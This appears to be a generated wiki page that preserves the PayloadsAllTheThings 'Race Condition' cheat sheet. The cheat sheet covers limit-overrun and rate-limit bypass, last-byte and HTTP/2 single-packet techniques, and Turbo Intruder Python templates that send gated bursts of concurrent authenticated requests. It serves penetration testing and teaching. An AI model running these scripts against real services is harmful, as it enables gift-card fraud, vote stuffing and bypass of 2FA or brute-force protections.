---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Race Condition

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-race-condition-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Race Condition/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Race Condition](../../topics/race-condition/race-condition.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-race-condition-readme |
| name | Race Condition |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Race%20Condition/README.md |

## Preserved Source Material

````yaml
_body: "# Race Condition\n\n> Race conditions may occur when a process is critically or unexpectedly dependent on the sequence\
  \ or timings of other events. In a web application environment, where multiple requests can be processed at a given time,\
  \ developers may leave concurrency to be handled by the framework, server, or programming language.\n\n## Summary\n\n- [Tools](#tools)\n\
  - [Methodology](#methodology)\n    - [Limit-overrun](#limit-overrun)\n    - [Rate-limit Bypass](#rate-limit-bypass)\n- [Techniques](#techniques)\n\
  \    - [HTTP/1.1 Last-byte Synchronization](#http11-last-byte-synchronization)\n    - [HTTP/2 Single-packet Attack](#http2-single-packet-attack)\n\
  - [Turbo Intruder](#turbo-intruder)\n    - [Example 1](#example-1)\n    - [Example 2](#example-2)\n- [Labs](#labs)\n- [References](#references)\n\
  \n## Tools\n\n- [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) - a Burp Suite extension for\
  \ sending large numbers of HTTP requests and analyzing the results.\n- [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat)\
  \ - Make exploiting race conditions in web applications highly efficient and ease-of-use.\n- [nxenon/h2spacex](https://github.com/nxenon/h2spacex)\
  \ - HTTP/2 Single Packet Attack low Level Library / Tool based on Scapy‌ + Exploit Timing Attacks\n\n## Methodology\n\n\
  ### Limit-overrun\n\nLimit-overrun refers to a scenario where multiple threads or processes compete to update or access\
  \ a shared resource, resulting in the resource exceeding its intended limits.\n\n**Examples**: Overdrawing limit, multiple\
  \ voting, multiple spending of a giftcard.\n\n- [Race Condition allows to redeem multiple times gift cards which leads to\
  \ free \"money\" - @muon4](https://hackerone.com/reports/759247)\n- [Race conditions can be used to bypass invitation limit\
  \ - @franjkovic](https://hackerone.com/reports/115007)\n- [Register multiple users using one invitation - @franjkovic](https://hackerone.com/reports/148609)\n\
  \n### Rate-limit Bypass\n\nRate-limit bypass occurs when an attacker exploits the lack of proper synchronization in rate-limiting\
  \ mechanisms to exceed intended request limits. Rate-limiting is designed to control the frequency of actions (e.g., API\
  \ requests, login attempts), but race conditions can allow attackers to bypass these restrictions.\n\n**Examples**: Bypassing\
  \ anti-bruteforce mechanism and 2FA.\n\n- [Instagram Password Reset Mechanism Race Condition - Laxman Muthiyah](https://youtu.be/4O9FjTMlHUM)\n\
  \n## Techniques\n\n### HTTP/1.1 Last-byte Synchronization\n\nSend every requests except the last byte, then \"release\"\
  \ each request by sending the last byte.\n\nExecute a last-byte synchronization using Turbo Intruder\n\n```py\nengine.queue(request,\
  \ gate='race1')\nengine.queue(request, gate='race1')\nengine.openGate('race1')\n```\n\n**Examples**:\n\n- [Cracking reCAPTCHA,\
  \ Turbo Intruder style - James Kettle](https://portswigger.net/research/cracking-recaptcha-turbo-intruder-style)\n\n###\
  \ HTTP/2 Single-packet Attack\n\nIn HTTP/2 you can send multiple HTTP requests concurrently over a single connection. In\
  \ the single-packet attack around ~20/30 requests will be sent and they will arrive at the same time on the server. Using\
  \ a single request remove the network jitter.\n\n- [PortSwigger/turbo-intruder/race-single-packet-attack.py](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py)\n\
  - Burp Suite\n    - Send a request to Repeater\n    - Duplicate the request 20 times (CTRL+R)\n    - Create a new group\
  \ and add all the requests\n    - Send group in parallel (single-packet attack)\n\n**Examples**:\n\n- [CVE-2022-4037 - Discovering\
  \ a race condition vulnerability in Gitlab with the single-packet attack - James Kettle](https://youtu.be/Y0NVIVucQNE)\n\
  \n## Turbo Intruder\n\n### Example 1\n\n1. Send request to turbo intruder\n2. Use this python code as a payload of the turbo\
  \ intruder\n\n   ```python\n   def queueRequests(target, wordlists):\n       engine = RequestEngine(endpoint=target.endpoint,\n\
  \                           concurrentConnections=30,\n                           requestsPerConnection=30,\n          \
  \                 pipeline=False\n                           )\n\n   for i in range(30):\n       engine.queue(target.req,\
  \ i)\n           engine.queue(target.req, target.baseInput, gate='race1')\n\n\n       engine.start(timeout=5)\n   engine.openGate('race1')\n\
  \n       engine.complete(timeout=60)\n\n\n   def handleResponse(req, interesting):\n       table.add(req)\n   ```\n\n3.\
  \ Now set the external HTTP header x-request: %s - :warning: This is needed by the turbo intruder\n4. Click \"Attack\"\n\
  \n### Example 2\n\nThis following template can use when use have to send race condition of request2 immediately after send\
  \ a request1 when the window may only be a few milliseconds.\n\n```python\ndef queueRequests(target, wordlists):\n    engine\
  \ = RequestEngine(endpoint=target.endpoint,\n                           concurrentConnections=30,\n                    \
  \       requestsPerConnection=100,\n                           pipeline=False\n                           )\n    request1\
  \ = '''\nPOST /target-URI-1 HTTP/1.1\nHost: <REDACTED>\nCookie: session=<REDACTED>\n\nparameterName=parameterValue\n   \
  \ '''\n\n    request2 = '''\nGET /target-URI-2 HTTP/1.1\nHost: <REDACTED>\nCookie: session=<REDACTED>\n    '''\n\n    engine.queue(request1,\
  \ gate='race1')\n    for i in range(30):\n        engine.queue(request2, gate='race1')\n    engine.openGate('race1')\n \
  \   engine.complete(timeout=60)\ndef handleResponse(req, interesting):\n    table.add(req)\n```\n\n## Labs\n\n- [PortSwigger\
  \ - Limit overrun race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)\n\
  - [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)\n\
  - [PortSwigger - Bypassing rate limits via race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)\n\
  - [PortSwigger - Multi-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)\n\
  - [PortSwigger - Single-endpoint race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)\n\
  - [PortSwigger - Exploiting time-sensitive vulnerabilities](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)\n\
  - [PortSwigger - Partial construction race conditions](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)\n\
  \n## References\n\n- [Beyond the Limit: Expanding single-packet race condition with a first sequence sync for breaking the\
  \ 65,535 byte limit - @ryotkak - August 2, 2024](https://web.archive.org/web/20251116040307/https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)\n\
  - [DEF CON 31 - Smashing the State Machine the True Potential of Web Race Conditions - James Kettle (@albinowax) - September\
  \ 15, 2023](https://web.archive.org/web/20231018114533/https://youtu.be/tKJzsaB1ZvI)\n- [Exploiting Race Condition Vulnerabilities\
  \ in Web Applications - Javan Rasokat - October 6, 2022](https://web.archive.org/web/20221006190254/http://conference.hitb.org/hitbsecconf2022sin/materials/D2%20COMMSEC%20-%20Exploiting%20Race%20Condition%20Vulnerabilities%20in%20Web%20Applications%20-%20Javan%20Rasokat.pdf)\n\
  - [New techniques and tools for web race conditions - Emma Stocks - August 10, 2023](https://web.archive.org/web/20230810160828/https://portswigger.net/blog/new-techniques-and-tools-for-web-race-conditions)\n\
  - [Race Condition Bug In Web App: A Use Case - Mandeep Jadon - April 24, 2018](https://web.archive.org/web/20260302041740/https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e)\n\
  - [Race conditions on the web - Josip Franjkovic - July 12, 2016](https://web.archive.org/web/20160712132451/https://www.josipfranjkovic.com/blog/race-conditions-on-web)\n\
  - [Smashing the state machine: the true potential of web race conditions - James Kettle (@albinowax) - August 9, 2023](https://web.archive.org/web/20230809185504/https://portswigger.net/research/smashing-the-state-machine)\n\
  - [Turbo Intruder: Embracing the billion-request attack - James Kettle (@albinowax) - January 25, 2019](https://web.archive.org/web/20190929052757/https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)"
_relative_path: Race Condition/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Race Condition/README.md
````
